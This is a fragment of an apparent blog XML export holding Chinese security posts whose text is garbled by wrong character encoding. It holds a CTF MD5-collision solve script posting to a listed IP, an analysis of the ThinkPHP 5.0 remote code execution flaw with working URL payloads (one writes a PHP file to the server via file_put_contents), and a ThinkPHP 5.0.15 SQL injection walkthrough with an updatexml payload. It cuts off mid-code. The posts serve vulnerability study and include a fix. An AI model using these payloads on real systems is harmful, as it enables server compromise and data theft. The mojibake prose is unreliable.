class="built_in">text</span></span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸé¥¶è¿‡<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbv9l62wj30vb0eymzk.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚$aä¸ºå¤§å†™å­—æ¯ï¼Œ$bä¸ºæ•°å­—ã€å¹¶ä¸”é•¿åº¦ä¸º6ï¼Œ$må’Œ$né•¿åº¦å°äº4<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=1&amp;n=1"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'str5'</span>: <span class="built_in">open</span>(<span class="string">'black.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str6'</span>: <span class="built_in">open</span>(<span class="string">'brown.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str7'</span>: <span class="built_in">open</span>(<span class="string">'white.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'a'</span>:<span class="string">'A'</span>,</span><br><span class="line">    <span class="string">'b'</span>:<span class="number">123456</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line"><span class="built_in">print</span> r.<span class="built_in">text</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wc5ixr3pj310y0e876l.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str8</span> = <span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$a</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$str9</span> = strtr(<span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$b</span>, <span class="literal">false</span>), <span class="variable">$m</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;str8 : <span class="variable">$str8</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;str9 : <span class="variable">$str9</span>&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$str8</span> == <span class="variable">$str9</span>) &amp;&amp; !(<span class="variable">$a</span> === <span class="variable">$b</span>) &amp;&amp; (strlen(<span class="variable">$b</span>) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"You're great,give you flag:"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hash()å‡½æ•°è®²è§£:<br><a href="https://www.php.net/manual/zh/function.hash.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.hash.php</a></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484797&amp;idx=4&amp;sn=5b752d13d4e29ebf19c43d5d9ba91385&amp;chksm=fac80141cdbf88574c8f3fb3baf2e1174f2e002e926a801201c8f9161d7c53549d9dba658adc&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;key=93ecb28c1069103a04285feb58979315a4b1749f4add40986e8814dc225f92fdbd54fa068c158a034dea2078f082317596004f0f3aca0fc76402361b547c8e2aeb5c001bbc960c35ce4996ca738f4cc3&amp;ascene=1&amp;uin=NDI2MjY3MjY%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=KKTGRrx8UvPH7CsKG5EoBGyRNBkVrSgQ%2F97%2BsambOvw%3D" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484797&amp;idx=4&amp;sn=5b752d13d4e29ebf19c43d5d9ba91385&amp;chksm=fac80141cdbf88574c8f3fb3baf2e1174f2e002e926a801201c8f9161d7c53549d9dba658adc&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;key=93ecb28c1069103a04285feb58979315a4b1749f4add40986e8814dc225f92fdbd54fa068c158a034dea2078f082317596004f0f3aca0fc76402361b547c8e2aeb5c001bbc960c35ce4996ca738f4cc3&amp;ascene=1&amp;uin=NDI2MjY3MjY%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=KKTGRrx8UvPH7CsKG5EoBGyRNBkVrSgQ%2F97%2BsambOvw%3D</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Thinkphp 5.0è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</title>
      <link href="/2019/03/31/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/31/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¯¥æ¼æ´å‡ºç°çš„åŸå› åœ¨äºThinkPHP5æ¡†æ¶åº•å±‚å¯¹æ§åˆ¶å™¨åè¿‡æ»¤ä¸ä¸¥ï¼Œä»è€Œè®©æ”»å‡»è€…å¯ä»¥é€šè¿‡urlè°ƒç”¨åˆ°ThinkPHPæ¡†æ¶å†…éƒ¨çš„æ•æ„Ÿå‡½æ•°ï¼Œè¿›è€Œå¯¼è‡´getshellæ¼æ´ï¼Œ</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>åœ¨App.php çš„run()æ–¹æ³•ä¸­çš„110è¡Œ<br>é€šè¿‡self::routerCheckå‡½æ•°è¿›è¡Œè·¯ç”±æ£€æµ‹<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1mvn5sojpj30mh06074o.jpg" alt=""><br>æ‰¾åˆ°routercheck<br>thinkphp/library/think/App.php :606<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m26s7a9lj30o10djabi.jpg" alt=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆè¿›å…¥$request-&gt;path()å‡½æ•°<br>/thinkphp/library/think/Request.php è¡Œæ•°:416è¡Œ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1mvsgvq85j30qx0bnq3y.jpg" alt=""><br>åˆè¿›å…¥pathinfo()å‡½æ•°ï¼Œ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3v5wu0vj30s80fnjte.jpg" alt=""><br>Config::get(â€˜var_pathinfoâ€™)æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®çš„å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºsï¼Œä»GETä¸­è·å–é”®å€¼ï¼Œç„¶åèµ‹å€¼ç»™routeCheckä¸­çš„$path<br>å†å›åˆ°App.phpï¼Œç”±äºæ²¡æœ‰åœ¨é…ç½®æ–‡ä»¶å®šä¹‰ä»»ä½•è·¯ç”±ï¼Œæ‰€ä»¥é»˜è®¤æŒ‰ç…§æ–¹å¼1è§£æè°ƒåº¦ã€‚<br>æ¥ç€è°ƒç”¨äº†parseUrl()<br>åœ¨ <code>thinkphp/library/think/Route.php</code>:1208<br>ä»1256è¿›è¡Œåˆ†æ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m2ct1qwij30pi0dojt1.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°è§£æURLçš„æ—¶å€™åªæ˜¯å°†URLæŒ‰åˆ†å‰²ç¬¦åˆ†å‰²ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œå®‰å…¨æ£€æµ‹ã€‚<br>å…¶ä¸­çš„è·¯ç”±urlä»Request::path()ä¸­è·å–<br><code>/thinkphp/library/think/Request.php</code>:<br>ç»§ç»­å¾€åè·Ÿ<br><code>thinkphp/library/think/App.php</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3taixcwj30ou0bgjsd.jpg" alt=""></p><p>Config::get(â€˜var_pathinfoâ€™)æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®çš„å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºsï¼Œä»GETä¸­è·å–é”®å€¼ï¼Œç„¶åèµ‹å€¼ç»™routeCheckä¸­çš„$path<br>æˆ‘ä»¬å†å›åˆ°App.php è¡Œæ•°:606<br>è¿™é‡Œä¼šè¿›è¡Œè·¯ç”±æ£€æµ‹ï¼Œæ£€æŸ¥$checkåä¼šè¿›å…¥elseåˆ†æ”¯å¯¼å…¥è·¯ç”±é…ç½®ï¼Œæ¥ç€æ£€æµ‹è·¯ç”±urlè°ƒåº¦ç»“æœä¸º$resultï¼Œå¦‚æœè°ƒåº¦å¤±è´¥ä¸”å¼€å¯äº†å¼ºåˆ¶è·¯ç”±$mustï¼Œåˆ™æŠ¥å‡ºè·¯ç”±æ— æ•ˆï¼Œæ¥ç€è¿›å…¥Route::parseUrlå‡½æ•°ï¼Œæ ¹æ®$pathï¼ˆè‡ªå®šä¹‰urlï¼‰è§£ææ“ä½œ<br>å¼€å§‹è·Ÿè¸ªparseUrlå‡½æ•°<br>/thinkphp/library/think/Route.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0gfx7zkj30vj0j9ju1.jpg" alt=""><br>è¿›å…¥parseUrlPathå‡½æ•°<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0hzlw24j30g50fhq49.jpg" alt=""><br>å¯¹æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œçš„urlåœ°å€åˆ†å‰²æˆæ•°ç»„æ¥è¿”å›<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0nnbj4ij30xj0hqmzn.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0zo2m15j30r10e9gnb.jpg" alt=""><br>å›åˆ°parseurl(),æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿”å›çš„ç»“æœèµ‹å€¼ä¸º$path,æå–è·¯ç”±ä¿¡æ¯åˆå°è£…åˆ°$route,<br>æœ€åè¿”å›,å›åˆ°App.php<br>åœ¨app.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n13akbkxj30ra0hpjt9.jpg" alt=""><br>æ‰¾åˆ°self::exec()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n15p5a4rj30lb0hvjte.jpg" alt=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ çš„å‡½æ•°ä¸ºself::module<br>å¼€å§‹è·Ÿè¸ªmoduleå‡½æ•°<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n16v6mhqj30r30i8myy.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n19ne3aqj30s90h5myu.jpg" alt=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ ¹æ®$config[â€˜app_multi_moduleâ€™]è¿›å…¥å¤šæ¨¡å—éƒ¨ç½²ï¼Œ$bindä¸ºNULLï¼Œåˆè¿›å…¥elseifåˆ†æ”¯ï¼Œåˆ¤æ–­æ¨¡å—æ˜¯å¦åœ¨ç¦æ­¢çš„åˆ—è¡¨é‡Œé¢$config[â€˜deny_module_listâ€™]ï¼Œè€Œä¸”mmoduleå­˜åœ¨ï¼Œ$available = trueï¼Œå°±ä¸ä¼šæŠ›å‡ºå¼‚å¸¸<br>moduleå‡½æ•°æœ€åçš„è¿”å›å€¼ï¼Œå‘ç°$controlleræ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆæ­¤æ—¶åº”è¯¥ä¸ºthink<code>\</code>appï¼Œä¹Ÿå°±æ˜¯return self::invokeMethod($call, $vars);<br>æ‰¾åˆ°invokeMethod()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1av6qjwj30wa0akq41.jpg" alt=""><br>æ­¤æ—¶ç©¿è¿›å»çš„$callä¹Ÿå°±æ˜¯$method,æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªthink\Appå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ åˆ™æ˜¯è°ƒç”¨æ–¹æ³•åç§°çš„å­—ç¬¦ä¸²invokefunctionï¼Œç„¶åé€šè¿‡åå°„ReflectionMethodè·å–è¿™ä¸ªå¯¹è±¡ä¸‹å¯¹åº”çš„æ–¹æ³•<br>å†é€šè¿‡å‡½æ•°$args = self::bindParams($reflect, $vars);è·å–ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯payload</p><p>æœ€åå†è°ƒç”¨åå°„$reflect-&gt;invokeArgs($args);ï¼Œå°†Payloadæ•°ç»„ä¼ å…¥åå°„å¯¹è±¡å‡½æ•°invokeFunctionï¼Œå®Œæˆä»£ç æ‰§è¡Œã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1fs4atzj30nd069dg9.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1j2g79yj30p30ft3ze.jpg" alt=""></p><p>åœ¨æ”»å‡»æ—¶æ³¨æ„ä½¿ç”¨ä¸€ä¸ªå·²å­˜åœ¨çš„moduleï¼Œå¦åˆ™ä¼šæŠ¥é”™ æ¨¡å—ä¸å­˜åœ¨<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m2zlh5wyj30lx09b3z9.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m31aqg68j30lz0810ti.jpg" alt=""><br>æ­¤å¤„åœ¨è·å–æ§åˆ¶å™¨åæ—¶ç›´æ¥ä»ä¹‹å‰çš„è§£æç»“æœä¸­è·å–ï¼Œæ— ä»»ä½•å®‰å…¨æ£€æŸ¥ã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m33n1mqyj30nn094mxv.jpg" alt=""><br>è¿™é‡Œå¯¹æ§åˆ¶å™¨ç±»è¿›è¡Œå®ä¾‹åŒ–<br>æ¥ç€åœ¨ <code>thinkphp/library/think/Loader.php</code>ï¼š454 æ‰¾åˆ°controller æ–¹æ³•<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m367b9n3j30q40aq0tu.jpg" alt=""><br>æ ¹æ®ä¼ å…¥çš„nameè·å–å¯¹åº”çš„ç±»ï¼Œå¦‚æœå­˜åœ¨å°±ç›´æ¥è¿”å›è¿™ä¸ªç±»çš„ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ã€‚<br>è·Ÿè¿›getModuleAndClassæ–¹æ³•ï¼š<code>Loader.php : 521 è¡Œ</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m38iewqcj30m20bvq3w.jpg" alt=""><br>å¦‚æœæ§åˆ¶å™¨åä¸­æœ‰<code>\</code>ï¼Œå°±ç›´æ¥è¿”å›ã€‚<br>å›åˆ°thinkphp/library/think/App.phpçš„moduleæ–¹æ³•ï¼Œ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3fqsimfj30m60ctdgw.jpg" alt=""><br>æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥è·å–åˆ°å¯¹åº”æ§åˆ¶å™¨ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè€Œæˆ‘ä»¬ç°åœ¨å¾—åˆ°äº†ä¸€ä¸ª<code>\think\App</code>çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿›è€Œé€šè¿‡urlè°ƒç”¨å…¶ä»»æ„çš„publicæ–¹æ³•ï¼ŒåŒæ—¶è§£æurlä¸­çš„é¢å¤–å‚æ•°ï¼Œå½“ä½œæ–¹æ³•çš„å‚æ•°ä¼ å…¥ã€‚</p><h1 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬"></a>æ¼æ´å½±å“ç‰ˆæœ¬</h1><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>åœ¨thinkphp5.0ç‰ˆæœ¬çš„thinkphp/library/think/App.php554è¡Œï¼Œthinkphp5.1ç‰ˆæœ¬çš„thinkphp/library/think/route/dispatch/Url.php63è¡Œæ·»åŠ å¦‚ä¸‹ä»£ç è¿›è¡Œè¿‡æ»¤ï¼š<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match('/^[<span class="string">A-Za-z</span>](<span class="link">\w|\.</span>)*$/', $controller)) &#123;</span><br><span class="line"><span class="code">    throw new HttpException(404, 'controller not exists:' . $controller);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3jdum1vj30la02z74d.jpg" alt=""></p><p>payload:<br>/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=1.php&amp;vars[1][]=&lt;?php phpinfo();?&gt;</p><p>s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://paper.seebug.org/770/" target="_blank" rel="noopener">https://paper.seebug.org/770/</a><br><a href="http://www.lmxspace.com/2018/12/12/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/12/12/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a><br><a href="https://blog.51cto.com/superwolf/2338829" target="_blank" rel="noopener">https://blog.51cto.com/superwolf/2338829</a><br><a href="https://www.kancloud.cn/zmwtp/tp5/120709" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/120709</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>ThinkPHP æ¡†æ¶ 5.0.15 SQL æ³¨å…¥åˆ†æ</title>
      <link href="/2019/03/31/ThinkPHP-%E6%A1%86%E6%9E%B6-5-0-15-SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/31/ThinkPHP-%E6%A1%86%E6%9E%B6-5-0-15-SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨thinkphp5.0.16 ä¹‹å‰å­˜åœ¨ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´,åœ¨insertå’Œupdate æ–¹æ³•ä¸­ ä¼ å…¥å‚æ•°å¯æ§,ä¸”æ— ä¸¥æ ¼è¿‡æ»¤ï¼Œæœ€ç»ˆå¯¼è‡´æœ¬æ¬¡ SQL æ³¨å…¥æ¼æ´å‘ç”Ÿã€‚<br>æ¡ä»¶:æ¼æ´çš„åˆ©ç”¨æ˜¯å»ºç«‹åœ¨thinkphpæ¥å—æ•°ç»„å½¢å¼çš„å‚æ•°çš„åŸºç¡€ä¸Šï¼Œè™½ç„¶è¿™ç§å†™æ³•åœ¨æŸ¥è¯¢ä¸­éå¸¸å°‘è§ï¼Œä½†æ˜¯åœ¨æ›´æ–°ã€æ’å…¥çš„æ—¶å€™è¿˜æ˜¯æœ‰ç›¸åº”çš„éœ€æ±‚çš„ã€‚</p><h1 id="ç¯å¢ƒæ­å»ºä¸å¤ç°"><a href="#ç¯å¢ƒæ­å»ºä¸å¤ç°" class="headerlink" title="ç¯å¢ƒæ­å»ºä¸å¤ç°"></a>ç¯å¢ƒæ­å»ºä¸å¤ç°</h1><p>thinkphp å®˜ç½‘ä¸‹è½½ 5.0.14 ç‰ˆæœ¬ä¸‹è½½ï¼š<a href="http://www.thinkphp.cn/down/1107.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1107.html</a></p><p>ä¸‹è½½è®¿é—®publicç›®å½•<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lagv6yubj30oy0c9mxv.jpg" alt=""></p><p>æ¥ä¸‹æ¥åˆ›å»ºæ•°æ®åº“<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> thinkphp;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(<span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,username <span class="built_in">varchar</span>(<span class="number">50</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"test"</span>,<span class="string">"thinkphp"</span>);</span><br></pre></td></tr></table></figure></p><p>åœ¨ <code>\application\database.php</code> ä¸­é…ç½®å¥½æ•°æ®åº“<br>åŒæ—¶åœ¨congfig.phpä¸­å°†app_debugå¼€ä¸ºtrue<br>æ¥ä¸‹æ¥åœ¨<code>\application\index\controller\Index.php</code><br>å†™ä¸€ä¸ª update åŠŸèƒ½çš„ demo<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$username</span> = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">  /<span class="regexp">/ dump($password)."&lt;br&gt;";</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ echo(db('user')-&gt;where(['id'=&gt;1])-&gt;update(['password'=&gt;$password]))."&lt;br&gt;";</span></span><br><span class="line"><span class="regexp">  Db::table("user")-&gt;where(["id"=&gt;1])-&gt;insert(["username"=&gt;$username]);</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/dump(Db::table('user')-&gt;where('id',1)-&gt;find());</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$n</span>ame = input(<span class="comment">"get.username/a"</span>);</span><br></pre></td></tr></table></figure><p>input()ä¸ºTPæ¡†æ¶çš„åŠ©æ‰‹å‡½æ•°ï¼Œget.name/a è¡¨ç¤ºè·å–getä¼ å…¥çš„nameå˜é‡ï¼Œå¹¶å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸ºæ•°ç»„ç±»å‹<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::table<span class="function"><span class="params">(<span class="string">"user"</span>)</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">"id"</span>=&gt;<span class="number">1</span>])</span>-&gt;</span>insert([<span class="string">"username"</span>=&gt;$username]);</span><br></pre></td></tr></table></figure></p><p>ç”¨æ¥å‘æ•°æ®åº“ä¸­æ’å…¥æ•°æ®<br>æ¥ä¸‹æ¥è®¿é—®<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php/index/index/index?username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lutdt6uoj31160dwjt8.jpg" alt=""></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>å½“è¾“å…¥æ•°æ®<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>ç”±input()è·å¾—æ•°æ®<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lw2y09s4j30i004ggn9.jpg" alt=""></p><p>æ¥ç€è°ƒç”¨äº†update()æ–¹æ³• åœ¨thinkphp/library/think/db/Query.php:2078<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwd536fhj30sk0dydhl.jpg" alt=""><br>åœ¨ 2094 è¡Œä¼šè°ƒç”¨thinkphp/library/think/db/Builder.php:720ï¼š ä¸‹çš„insert()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwfmeyfkj30km0dl0tx.jpg" alt=""><br>æ¥ç€ä¼šè°ƒç”¨parseData()è§£ææ•°æ® åœ¨/library/think/db/Builder.php:86<br>ä»101 è¡Œå¼€å§‹åˆ†æ:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwlm2ja0j30p50ia0uu.jpg" alt=""><br>å°†å˜é‡èµ‹ç»™$key å€¼èµ‹ç»™$var å³:<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key : <span class="string">"username"</span></span><br><span class="line">$val : &#123;<span class="string">"inc"</span>,<span class="string">"updatexml(1,concat(0x7,user(),0x7e),1)"</span>,<span 